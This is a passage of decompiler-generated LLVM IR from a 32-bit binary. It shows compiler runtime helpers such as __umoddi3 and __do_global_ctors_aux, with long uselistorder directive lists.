  %v10_805395f = or i64 %v9_805395f, %v6_805395f
  %v12_805395f = udiv i64 %v10_805395f, %v5_805393c
  %v13_805395f = trunc i64 %v12_805395f to i32
  %v14_805395f = urem i64 %v10_805395f, %v5_805393c
  %v15_805395f = trunc i64 %v14_805395f to i32
  %v3_8053967 = and i64 %v12_805395f, 4294967295
  %v4_8053967 = mul nuw i64 %v3_8053967, %phitmp
  %v5_8053967 = trunc i64 %v4_8053967 to i32
  %v6_8053967 = udiv i64 %v4_8053967, 4294967296
  %v7_8053967 = trunc i64 %v6_8053967 to i32
  %v7_805396b = icmp ugt i32 %v7_8053967, %v15_805395f
  br i1 %v7_805396b, label %dec_label_pc_80539a0, label %dec_label_pc_805396f

dec_label_pc_805396f:                             ; preds = %bb63
  %v12_805396f = icmp eq i32 %v7_8053967, %v15_805395f
  br i1 %v12_805396f, label %bb65, label %dec_label_pc_8053973

dec_label_pc_8053973:                             ; preds = %bb65, %dec_label_pc_805396f
  store i32 %v13_805395f, i32* @ecx, align 4
  br label %dec_label_pc_80538a0

dec_label_pc_8053980:                             ; preds = %dec_label_pc_80538d7, %dec_label_pc_80538c0
  store i32 0, i32* @ecx, align 4
  br label %dec_label_pc_80538a0

bb65:                                             ; preds = %dec_label_pc_805396f
  %v5_805398f = shl i32 %v4_8053883, %v3_80538c8
  %v7_8053991 = icmp ult i32 %v5_805398f, %v5_8053967
  %v1_8053993 = icmp eq i1 %v7_8053991, false
  br i1 %v1_8053993, label %dec_label_pc_8053973, label %dec_label_pc_80539a0

dec_label_pc_80539a0:                             ; preds = %bb65, %bb63
  %v1_80539a3 = add i32 %v13_805395f, -1
  store i32 %v1_80539a3, i32* @ecx, align 4
  br label %dec_label_pc_80538a0

; uselistorder directives
  uselistorder i32 %v1_80539a3, { 1, 0 }
  uselistorder i32 %v13_805395f, { 0, 2, 1 }
  uselistorder i32 %v2_8053931, { 3, 2, 1, 0 }
  uselistorder i32 %v9_805390e, { 1, 0 }
  uselistorder i32 %v3_80538c8, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v4_8053889, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 %v4_8053883, { 1, 0, 2, 3 }
  uselistorder i32 %v4_8053876, { 5, 1, 3, 4, 2, 7, 6, 0 }
  uselistorder i32* @edx, { 242, 60, 61, 243, 41, 225, 226, 227, 228, 229, 230, 234, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 37, 34, 35, 36, 39, 40, 38, 42, 236, 241, 231, 232, 233, 240, 43, 44, 235, 62, 104, 245, 246, 247, 248, 249, 70, 71, 1, 72, 106, 107, 108, 109, 110, 111, 112, 250, 251, 252, 253, 254, 255, 91, 237, 238, 63, 223, 224, 92, 93, 94, 95, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 256, 113, 114, 115, 117, 2, 118, 119, 120, 121, 122, 123, 124, 125, 257, 258, 259, 73, 57, 58, 126, 260, 244, 96, 97, 127, 128, 129, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 130, 131, 132, 133, 134, 116, 138, 64, 135, 136, 137, 139, 140, 141, 142, 143, 147, 148, 149, 156, 160, 161, 150, 151, 152, 158, 159, 157, 153, 154, 155, 144, 145, 146, 88, 89, 6, 239, 98, 99, 100, 162, 163, 3, 164, 165, 166, 167, 168, 74, 65, 66, 67, 169, 170, 171, 287, 288, 289, 290, 85, 102, 103, 68, 291, 172, 173, 174, 175, 176, 178, 179, 180, 181, 59, 0, 182, 7, 183, 185, 187, 188, 4, 190, 184, 186, 189, 90, 191, 192, 193, 5, 194, 177, 209, 69, 195, 196, 210, 105, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 211, 212, 213, 214, 220, 221, 222, 215, 216, 217, 218, 219, 292, 293, 294, 295, 296, 75, 76, 77, 78, 80, 79, 81, 82, 83, 84, 86, 87, 101 }
  uselistorder i32* @ecx, { 220, 221, 222, 223, 224, 225, 54, 189, 219, 44, 45, 46, 190, 191, 192, 193, 194, 195, 199, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 26, 27, 28, 29, 30, 42, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 47, 48, 49, 50, 201, 202, 203, 204, 205, 207, 208, 217, 218, 196, 197, 198, 216, 206, 52, 53, 51, 200, 2, 66, 67, 68, 65, 69, 70, 71, 72, 209, 210, 211, 212, 213, 214, 187, 188, 73, 74, 76, 77, 80, 78, 79, 82, 81, 83, 226, 84, 85, 86, 87, 88, 89, 9, 90, 91, 92, 93, 94, 95, 96, 97, 10, 11, 98, 99, 100, 101, 102, 103, 75, 105, 55, 104, 106, 107, 108, 110, 114, 120, 121, 122, 123, 111, 112, 113, 117, 118, 119, 116, 115, 109, 57, 8, 3, 56, 215, 58, 59, 60, 61, 124, 125, 126, 62, 63, 127, 128, 129, 130, 131, 132, 133, 135, 134, 1, 4, 137, 138, 139, 142, 143, 144, 145, 146, 147, 149, 148, 140, 141, 5, 150, 151, 152, 153, 154, 155, 136, 170, 156, 157, 171, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 6, 168, 169, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 7, 185, 186, 64 }
  uselistorder i64 %d, { 1, 0, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_8053903, { 1, 0 }
}

define i64 @__umoddi3(i64 %u, i64 %v) local_unnamed_addr {
entry:
  %tmp74 = call i32 @__decompiler_undefined_function_0()
  %tmp75 = call i64 @__decompiler_undefined_function_2()
  %v4_80539c6 = trunc i64 %u to i32
  %v4_80539c9 = trunc i64 %v to i32
  %v4_80539cc = trunc i64 %tmp75 to i32
  %v5_80539d7 = sext i32 %tmp74 to i64
  %v5_80539da35 = and i64 %u, 4294967295
  %v5_80539e034 = and i64 %v, 4294967295
  %v1_80539e8 = icmp eq i32 %tmp74, 0
  %v1_80539ea = icmp eq i1 %v1_80539e8, false
  br i1 %v1_80539ea, label %dec_label_pc_8053a00, label %dec_label_pc_80539ec

dec_label_pc_80539ec:                             ; preds = %entry
  %tmp = icmp ugt i32 %v4_80539cc, %v4_80539c9
  br i1 %tmp, label %dec_label_pc_80539f0, label %dec_label_pc_8053a60

dec_label_pc_80539f0:                             ; preds = %dec_label_pc_80539ec
  %v5_80539f2 = mul nuw i64 %v5_80539e034, 4294967296
  %v6_80539f2 = or i64 %v5_80539f2, %v5_80539da35
  %v7_80539f2 = and i64 %tmp75, 4294967295
  %v10_80539f2 = urem i64 %v6_80539f2, %v7_80539f2
  %extract.t103 = trunc i64 %v10_80539f2 to i32
  br label %dec_label_pc_80539f4

dec_label_pc_80539f4:                             ; preds = %dec_label_pc_8053a73, %dec_label_pc_80539f0
  %v10_80539f2.sink.off0 = phi i32 [ %extract.t103, %dec_label_pc_80539f0 ], [ %extract.t104, %dec_label_pc_8053a73 ]
  br label %dec_label_pc_8053a10

dec_label_pc_8053a00:                             ; preds = %entry
  %v11_8053a03 = icmp ult i32 %tmp74, %v4_80539c9
  %tmp105 = icmp ugt i32 %tmp74, %v4_80539c9
  br i1 %tmp105, label %dec_label_pc_8053a10, label %dec_label_pc_8053a20

dec_label_pc_8053a10:                             ; preds = %dec_label_pc_8053a00, %bb98, %dec_label_pc_8053a4b, %dec_label_pc_80539f4
  %stack_var_-52.0.in = phi i32 [ %v2_8053aff, %bb98 ], [ %stack_var_-20.0.off0, %dec_label_pc_8053a4b ], [ %v10_80539f2.sink.off0, %dec_label_pc_80539f4 ], [ %v4_80539c6, %dec_label_pc_8053a00 ]
  %stack_var_-52.0 = sext i32 %stack_var_-52.0.in to i64
  ret i64 %stack_var_-52.0

dec_label_pc_8053a20:                             ; preds = %dec_label_pc_8053a00
  %v6_8053a20 = call i32 @llvm.ctlz.i32(i32 %tmp74, i1 true)
  %v2_8053a24 = icmp eq i32 %v6_8053a20, 0
  %v1_8053a2a = icmp eq i1 %v2_8053a24, false
  br i1 %v1_8053a2a, label %dec_label_pc_8053a90, label %dec_label_pc_8053a2c

dec_label_pc_8053a2c:                             ; preds = %dec_label_pc_8053a20
  br i1 %v11_8053a03, label %dec_label_pc_8053a3c, label %dec_label_pc_8053a34

dec_label_pc_8053a34:                             ; preds = %dec_label_pc_8053a2c
  %v8_8053a3a = icmp ult i32 %v4_80539c6, %v4_80539cc
  br i1 %v8_8053a3a, label %dec_label_pc_8053a4b, label %dec_label_pc_8053a3c

dec_label_pc_8053a3c:                             ; preds = %dec_label_pc_8053a2c, %dec_label_pc_8053a34
  %v6_8053a42 = sub i32 %v4_80539c6, %v4_80539cc
  br label %dec_label_pc_8053a4b

dec_label_pc_8053a4b:                             ; preds = %dec_label_pc_8053a34, %dec_label_pc_8053a3c
  %stack_var_-20.0.off0 = phi i32 [ %v6_8053a42, %dec_label_pc_8053a3c ], [ %v4_80539c6, %dec_label_pc_8053a34 ]
  br label %dec_label_pc_8053a10

dec_label_pc_8053a60:                             ; preds = %dec_label_pc_80539ec
  %v1_8053a63 = icmp eq i32 %v4_80539cc, 0
  %v1_8053a65 = icmp eq i1 %v1_8053a63, false
  br i1 %v1_8053a65, label %dec_label_pc_8053a73, label %dec_label_pc_8053a67

dec_label_pc_8053a67:                             ; preds = %dec_label_pc_8053a60
  %tmp85 = icmp eq i32 %v4_80539cc, 1
  %v13_8053a6e = zext i1 %tmp85 to i32
  br label %dec_label_pc_8053a73

dec_label_pc_8053a73:                             ; preds = %dec_label_pc_8053a60, %dec_label_pc_8053a67
  %v0_8053a7e = phi i32 [ %v4_80539cc, %dec_label_pc_8053a60 ], [ %v13_8053a6e, %dec_label_pc_8053a67 ]
  %v4_8053a79 = mul i64 %v5_80539d7, 4294967296
  %v6_8053a79 = or i64 %v4_8053a79, %v5_80539e034
  %v7_8053a79 = zext i32 %v0_8053a7e to i64
  %v10_8053a79 = urem i64 %v6_8053a79, %v7_8053a79
  %v5_8053a7e = mul nuw i64 %v10_8053a79, 4294967296
  %v6_8053a7e = or i64 %v5_8053a7e, %v5_80539da35
  %v10_8053a7e = urem i64 %v6_8053a7e, %v7_8053a79
  %extract.t104 = trunc i64 %v10_8053a7e to i32
  br label %dec_label_pc_80539f4

dec_label_pc_8053a90:                             ; preds = %dec_label_pc_8053a20
  %v6_8053a95 = sub nsw i32 32, %v6_8053a20
  %v2_8053aa1 = urem i32 %v6_8053a95, 32
  %v4_8053aa1 = icmp eq i32 %v2_8053aa1, 0
  br i1 %v4_8053aa1, label %bb89, label %bb

bb:                                               ; preds = %dec_label_pc_8053a90
  %v5_8053aa1 = lshr i32 %v4_80539cc, %v2_8053aa1
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_8053a90, %bb
  %v0_8053aab = phi i32 [ %v4_80539cc, %dec_label_pc_8053a90 ], [ %v5_8053aa1, %bb ]
  %v5_8053aa9 = shl i32 %tmp74, %v6_8053a20
  %v2_8053aab = or i32 %v0_8053aab, %v5_8053aa9
  %v5_8053aad = sext i32 %v2_8053aab to i64
  %v5_8053ab3 = shl i32 %v4_80539cc, %v6_8053a20
  br i1 %v4_8053aa1, label %bb93, label %bb90

bb90:                                             ; preds = %bb89
  %v5_8053abb = lshr i32 %v4_80539c6, %v2_8053aa1
  br label %bb93

bb93:                                             ; preds = %bb89, %bb90
  %v0_8053ac5 = phi i32 [ %v4_80539c6, %bb89 ], [ %v5_8053abb, %bb90 ]
  %v5_8053ac3 = shl i32 %v4_80539c9, %v6_8053a20
  %v2_8053ac5 = or i32 %v0_8053ac5, %v5_8053ac3
  %v5_8053aca = shl i32 %v4_80539c6, %v6_8053a20
  br i1 %v4_8053aa1, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v5_8053ad2 = lshr i32 %v4_80539c9, %v2_8053aa1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  %v7_8053ad4 = phi i32 [ %v4_80539c9, %bb93 ], [ %v5_8053ad2, %bb94 ]
  %v6_8053ad4 = zext i32 %v2_8053ac5 to i64
  %v8_8053ad4 = zext i32 %v7_8053ad4 to i64
  %v9_8053ad4 = mul nuw i64 %v8_8053ad4, 4294967296
  %v10_8053ad4 = or i64 %v9_8053ad4, %v6_8053ad4
  %v12_8053ad4 = udiv i64 %v10_8053ad4, %v5_8053aad
  %v14_8053ad4 = urem i64 %v10_8053ad4, %v5_8053aad
  %v15_8053ad4 = trunc i64 %v14_8053ad4 to i32
  %v2_8053ada = zext i32 %v5_8053ab3 to i64
  %v3_8053ada = and i64 %v12_8053ad4, 4294967295
  %v4_8053ada = mul nuw i64 %v3_8053ada, %v2_8053ada
  %v5_8053ada = trunc i64 %v4_8053ada to i32
  %v6_8053ada = udiv i64 %v4_8053ada, 4294967296
  %v7_8053ada = trunc i64 %v6_8053ada to i32
  %v10_8053adc = icmp ugt i32 %v7_8053ada, %v15_8053ad4
  br i1 %v10_8053adc, label %dec_label_pc_8053b18, label %dec_label_pc_8053ae1

dec_label_pc_8053ae1:                             ; preds = %bb95
  %v15_8053ae1 = icmp eq i32 %v7_8053ada, %v15_8053ad4
  br i1 %v15_8053ae1, label %dec_label_pc_8053b14, label %bb96

bb96:                                             ; preds = %dec_label_pc_8053b14, %dec_label_pc_8053ae1, %dec_label_pc_8053b18
  %v1_8053aeb = phi i32 [ %v7_8053ada, %dec_label_pc_8053b14 ], [ %v7_8053ada, %dec_label_pc_8053ae1 ], [ %v9_8053b1a, %dec_label_pc_8053b18 ]
  %v1_8053ae9 = phi i32 [ %v5_8053ada, %dec_label_pc_8053b14 ], [ %v5_8053ada, %dec_label_pc_8053ae1 ], [ %v2_8053b18, %dec_label_pc_8053b18 ]
  %v2_8053ae9 = sub i32 %v5_8053aca, %v1_8053ae9
  %v7_8053ae9 = icmp ult i32 %v5_8053aca, %v1_8053ae9
  %v3_8053aeb = zext i1 %v7_8053ae9 to i32
  %v4_8053aeb = sub i32 %v15_8053ad4, %v1_8053aeb
  %v5_8053aeb = add i32 %v3_8053aeb, %v4_8053aeb
  %v5_8053af5 = lshr i32 %v2_8053ae9, %v6_8053a20
  br i1 %v4_8053aa1, label %bb98, label %bb97

bb97:                                             ; preds = %bb96
  %v5_8053afd = shl i32 %v5_8053aeb, %v2_8053aa1
  br label %bb98

bb98:                                             ; preds = %bb96, %bb97
  %v1_8053aff = phi i32 [ %v5_8053aeb, %bb96 ], [ %v5_8053afd, %bb97 ]
  %v2_8053aff = or i32 %v1_8053aff, %v5_8053af5
  br label %dec_label_pc_8053a10

dec_label_pc_8053b14:                             ; preds = %dec_label_pc_8053ae1
  %v7_8053b14 = icmp ult i32 %v5_8053aca, %v5_8053ada
  %v1_8053b16 = icmp eq i1 %v7_8053b14, false
  br i1 %v1_8053b16, label %bb96, label %dec_label_pc_8053b18

dec_label_pc_8053b18:                             ; preds = %dec_label_pc_8053b14, %bb95
  %v2_8053b18 = sub i32 %v5_8053ada, %v5_8053ab3
  %v7_8053b18 = icmp ult i32 %v5_8053ada, %v5_8053ab3
  %v7_8053b1a = zext i1 %v7_8053b18 to i32
  %v8_8053b1a = sub i32 %v7_8053ada, %v2_8053aab
  %v9_8053b1a = add i32 %v7_8053b1a, %v8_8053b1a
  br label %bb96

; uselistorder directives
  uselistorder i32 %v1_8053ae9, { 1, 0 }
  uselistorder i32 %v7_8053ada, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v5_8053ada, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v15_8053ad4, { 2, 0, 1 }
  uselistorder i32 %v5_8053ab3, { 1, 2, 0 }
  uselistorder i32 %v2_8053aa1, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_8053a20, { 6, 0, 5, 1, 4, 3, 2 }
  uselistorder i64 %v5_80539e034, { 1, 0 }
  uselistorder i32 %v4_80539cc, { 5, 3, 6, 4, 2, 8, 7, 1, 0 }
  uselistorder i32 %v4_80539c9, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %v4_80539c6, { 6, 2, 5, 4, 3, 0, 1 }
  uselistorder i32 %tmp74, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 32, { 4, 57, 5, 58, 102, 49, 76, 103, 104, 105, 64, 65, 66, 67, 6, 7, 8, 50, 68, 9, 69, 70, 71, 72, 75, 73, 74, 77, 106, 107, 108, 10, 83, 84, 46, 85, 45, 12, 11, 59, 86, 109, 78, 82, 13, 14, 15, 87, 88, 51, 89, 17, 16, 0, 79, 81, 90, 19, 18, 20, 21, 43, 1, 22, 23, 44, 2, 39, 40, 41, 91, 25, 24, 3, 26, 27, 94, 92, 61, 62, 93, 95, 60, 96, 97, 42, 63, 98, 99, 28, 52, 100, 53, 29, 54, 101, 30, 31, 55, 32, 56, 34, 33, 80, 36, 35, 47, 48, 38, 37 }
  uselistorder i1 true, { 22, 23, 0, 8, 9, 10, 4, 1, 18, 19, 2, 3, 5, 11, 12, 13, 14, 15, 6, 16, 17, 7, 20, 21 }
  uselistorder i64 4294967296, { 1, 0, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i64 4294967295, { 8, 0, 1, 2, 3, 4, 5, 7, 6, 9 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb96, { 2, 0, 1 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_8053a73, { 1, 0 }
  uselistorder label %dec_label_pc_8053a4b, { 1, 0 }
  uselistorder label %dec_label_pc_8053a3c, { 1, 0 }
  uselistorder label %dec_label_pc_8053a10, { 1, 2, 0, 3 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp5, i32* %stack_var_-16, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-12, align 4
  %v0_8053b27 = load i32, i32* @global_var_8056074.329, align 4
  %v10_8053b2c = icmp eq i32 %v0_8053b27, -1
  br i1 %v10_8053b2c, label %dec_label_pc_8053b50, label %dec_label_pc_8053b31

dec_label_pc_8053b31:                             ; preds = %entry
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b40

dec_label_pc_8053b40:                             ; preds = %dec_label_pc_8053b40, %dec_label_pc_8053b31
  %v4_8053b40 = phi i32 [ %v3_8053b42, %dec_label_pc_8053b40 ], [ %v0_8053b27, %dec_label_pc_8053b31 ]
  call void @__pseudo_call(i32 %v4_8053b40)
  %v0_8053b42 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053b42 = add i32 %v0_8053b42, ptrtoint (i32* @global_var_8056070.411 to i32)
  %v2_8053b42 = inttoptr i32 %v1_8053b42 to i32*
  %v3_8053b42 = load i32, i32* %v2_8053b42, align 4
  %v1_8053b48 = add i32 %v0_8053b42, -4
  store i32 %v1_8053b48, i32* %ebx.global-to-local, align 4
  %v10_8053b4b = icmp eq i32 %v3_8053b42, -1
  %v1_8053b4e = icmp eq i1 %v10_8053b4b, false
  br i1 %v1_8053b4e, label %dec_label_pc_8053b40, label %dec_label_pc_8053b50.loopexit

dec_label_pc_8053b50.loopexit:                    ; preds = %dec_label_pc_8053b40
  %v2_8053b50.pre = load i32, i32* %stack_var_-16, align 4
  %v2_8053b51.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8053b50

dec_label_pc_8053b50:                             ; preds = %dec_label_pc_8053b50.loopexit, %entry
  %v2_8053b51 = phi i32 [ %v2_8053b51.pre, %dec_label_pc_8053b50.loopexit ], [ %tmp6, %entry ]
  %v2_8053b50 = phi i32 [ %v2_8053b50.pre, %dec_label_pc_8053b50.loopexit ], [ %tmp5, %entry ]
  store i32 %v2_8053b51, i32* %ebx.global-to-local, align 4
  ret i32 %v2_8053b50

; uselistorder directives
  uselistorder i32 %v0_8053b27, { 1, 0 }
  uselistorder i1 false, { 525, 516, 517, 518, 519, 520, 521, 522, 523, 124, 125, 126, 2, 127, 128, 47, 130, 129, 131, 487, 488, 32, 514, 11, 490, 489, 491, 492, 61, 62, 33, 59, 60, 34, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 6, 75, 76, 77, 78, 79, 80, 81, 82, 83, 7, 84, 85, 35, 86, 9, 8, 87, 88, 89, 36, 90, 91, 92, 93, 94, 10, 95, 96, 97, 98, 99, 100, 12, 101, 104, 105, 102, 103, 14, 106, 13, 107, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 511, 512, 513, 493, 510, 108, 48, 54, 55, 241, 242, 527, 49, 526, 37, 246, 247, 248, 249, 250, 251, 252, 253, 254, 3, 255, 256, 257, 243, 244, 245, 258, 262, 263, 15, 264, 265, 266, 267, 532, 533, 534, 535, 536, 146, 147, 148, 149, 151, 150, 152, 153, 154, 155, 4, 5, 259, 260, 261, 43, 537, 538, 539, 268, 132, 133, 134, 486, 219, 220, 221, 222, 223, 224, 225, 56, 57, 226, 227, 228, 229, 0, 109, 113, 110, 111, 112, 114, 115, 116, 117, 118, 540, 541, 269, 270, 271, 272, 273, 1, 274, 275, 38, 276, 135, 136, 16, 17, 137, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 303, 302, 20, 19, 304, 305, 18, 306, 307, 308, 309, 542, 44, 545, 543, 544, 50, 156, 157, 158, 119, 120, 310, 311, 546, 528, 529, 530, 21, 531, 230, 159, 160, 312, 314, 313, 315, 316, 317, 318, 319, 320, 23, 24, 22, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 338, 337, 339, 340, 341, 342, 343, 344, 345, 346, 139, 138, 140, 204, 203, 205, 547, 347, 348, 548, 549, 350, 349, 351, 352, 353, 354, 355, 357, 356, 358, 359, 360, 361, 362, 363, 364, 375, 365, 368, 369, 370, 366, 371, 374, 25, 373, 372, 51, 367, 209, 210, 507, 508, 509, 231, 232, 379, 376, 377, 378, 380, 233, 52, 234, 235, 236, 141, 39, 142, 381, 550, 551, 552, 553, 554, 555, 238, 382, 383, 384, 391, 385, 386, 387, 388, 389, 390, 40, 392, 393, 394, 395, 396, 397, 402, 398, 399, 400, 401, 403, 404, 405, 41, 58, 406, 407, 417, 418, 45, 419, 420, 421, 422, 42, 423, 424, 425, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 416, 121, 122, 123, 426, 427, 408, 409, 410, 411, 412, 413, 414, 415, 439, 440, 441, 442, 443, 444, 445, 46, 446, 447, 448, 143, 144, 145, 449, 450, 451, 452, 453, 454, 455, 456, 26, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 476, 481, 27, 482, 483, 472, 473, 474, 475, 477, 478, 479, 480, 556, 557, 558, 560, 559, 29, 561, 28, 562, 167, 161, 30, 162, 163, 164, 165, 166, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 192, 190, 191, 31, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 206, 207, 208, 211, 212, 213, 214, 215, 216, 217, 218, 237, 239, 240, 484, 485, 515, 524, 53, 563, 564 }
  uselistorder i32 -4, { 8, 9, 10, 11, 12, 13, 14, 15, 60, 61, 16, 17, 18, 62, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 38, 39, 67, 0, 68, 69, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 5, 65, 63, 6, 66, 7, 57, 3, 58, 64, 2, 4, 59 }
  uselistorder void (i32)* @__pseudo_call, { 18, 15, 6, 19, 20, 21, 7, 0, 8, 9, 10, 11, 12, 13, 14, 16, 3, 4, 5, 22, 23, 24, 1, 2, 17 }
  uselistorder i32 0, { 1066, 1851, 1852, 1853, 1854, 1067, 1855, 1856, 1857, 171, 166, 167, 168, 169, 170, 1858, 172, 173, 174, 1307, 1308, 175, 1309, 176, 1068, 177, 1069, 178, 1310, 1070, 1311, 1312, 19, 179, 1071, 343, 32, 1313, 33, 1795, 365, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1072, 398, 1803, 1804, 1073, 399, 1074, 1075, 1805, 1806, 1807, 1808, 1809, 1810, 1812, 1813, 1814, 1815, 1816, 1257, 1258, 1180, 1184, 1181, 1182, 1183, 1076, 1185, 1186, 1187, 1188, 1077, 1189, 1078, 1190, 1191, 1192, 1051, 79, 80, 81, 1193, 1194, 1195, 1196, 82, 1197, 34, 83, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 84, 85, 86, 1216, 1217, 1218, 1079, 162, 1080, 62, 1081, 1230, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1082, 1226, 1227, 1228, 1229, 344, 1231, 1232, 1233, 1234, 180, 1083, 367, 1235, 1236, 1084, 1085, 35, 1086, 1237, 1087, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 87, 1247, 1248, 400, 1249, 1250, 1251, 1252, 1052, 1253, 1254, 1255, 1256, 36, 1259, 1260, 1261, 66, 1088, 1262, 1264, 1265, 1263, 1275, 1276, 1277, 1278, 1279, 1266, 1267, 1268, 1269, 1270, 1271, 1280, 1272, 1273, 1274, 89, 1281, 1282, 88, 1050, 1817, 1818, 1819, 1820, 1821, 1822, 1823, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831, 366, 1832, 1833, 1834, 1840, 1841, 1842, 1843, 1844, 1089, 1811, 181, 1090, 1283, 346, 1284, 345, 1471, 368, 1472, 1473, 1474, 1862, 347, 1860, 1861, 182, 1091, 1092, 185, 1093, 1094, 1479, 67, 1095, 1480, 155, 156, 157, 1481, 1482, 1483, 1484, 1485, 183, 1096, 20, 184, 1097, 1475, 1476, 1477, 1478, 187, 186, 188, 1486, 1493, 189, 1494, 1495, 1496, 1497, 1498, 90, 1500, 1501, 1499, 1502, 1503, 91, 140, 1504, 1505, 1506, 1507, 92, 139, 1508, 1509, 1510, 190, 191, 192, 1869, 1870, 1871, 1872, 193, 194, 195, 196, 1098, 1873, 1874, 197, 1875, 198, 199, 200, 369, 370, 1358, 1359, 201, 202, 1360, 371, 372, 1361, 1362, 429, 151, 1487, 93, 1488, 141, 1489, 430, 1490, 1491, 1492, 1876, 94, 142, 1877, 163, 1845, 1846, 373, 1432, 1511, 0, 1099, 1835, 1836, 374, 203, 1314, 1100, 1315, 1316, 1317, 1318, 1794, 204, 1101, 1433, 1434, 1435, 205, 206, 1436, 1437, 375, 1438, 1439, 148, 207, 164, 1440, 208, 1319, 1, 2, 3, 4, 376, 5, 1285, 1053, 1286, 1287, 1292, 1288, 1289, 1290, 1291, 1293, 1294, 1295, 1296, 1297, 1298, 1102, 209, 425, 426, 1299, 1300, 210, 1878, 1879, 211, 1039, 1040, 431, 1041, 377, 1880, 1881, 1042, 212, 1512, 1513, 214, 213, 1103, 1104, 1105, 1106, 1514, 1515, 1516, 1517, 1518, 37, 38, 353, 97, 98, 96, 1521, 1519, 1520, 1522, 95, 1338, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 99, 68, 100, 101, 1107, 1339, 1340, 1341, 1342, 215, 1108, 1109, 1523, 1110, 432, 433, 434, 1043, 1524, 1525, 1526, 1527, 1528, 1529, 378, 379, 1111, 1530, 1531, 1054, 1532, 1533, 1534, 152, 401, 402, 403, 218, 217, 216, 1535, 1112, 1536, 1537, 220, 219, 1113, 221, 1538, 1539, 1882, 1541, 1540, 1542, 1055, 1543, 1544, 435, 1545, 1546, 1547, 1548, 436, 437, 1549, 1550, 1551, 6, 360, 1552, 1554, 103, 39, 21, 1555, 1556, 102, 40, 42, 1114, 1115, 41, 105, 104, 222, 1116, 223, 1117, 380, 1557, 1558, 1118, 28, 1553, 1559, 1119, 1120, 405, 1560, 406, 408, 410, 412, 407, 409, 411, 413, 438, 439, 1561, 404, 1562, 1884, 1883, 69, 1886, 1887, 135, 136, 348, 1056, 1885, 224, 225, 226, 227, 1888, 228, 1363, 1364, 1365, 229, 230, 231, 232, 233, 234, 440, 235, 1301, 1121, 1302, 1303, 1122, 1563, 441, 442, 1564, 1057, 1889, 1565, 1864, 1865, 1863, 1866, 1867, 106, 1868, 1441, 443, 1442, 7, 444, 1366, 1566, 446, 1567, 1569, 381, 43, 44, 45, 414, 1568, 445, 1570, 242, 46, 1123, 415, 416, 1571, 47, 447, 1124, 1572, 237, 238, 239, 240, 241, 236, 1573, 448, 243, 1574, 1575, 1058, 1125, 1577, 1576, 107, 1578, 143, 144, 165, 449, 1890, 1891, 1892, 1893, 1894, 1895, 8, 1579, 1580, 1581, 1582, 1583, 9, 1584, 145, 1585, 146, 1586, 450, 451, 244, 245, 1587, 246, 247, 1044, 1588, 1590, 1591, 1059, 1589, 249, 248, 1610, 1611, 1595, 250, 1126, 1599, 1600, 1601, 1060, 1607, 1608, 1609, 1061, 108, 109, 110, 111, 1606, 1605, 1127, 349, 1602, 1603, 1604, 1592, 1593, 1594, 251, 1596, 1597, 452, 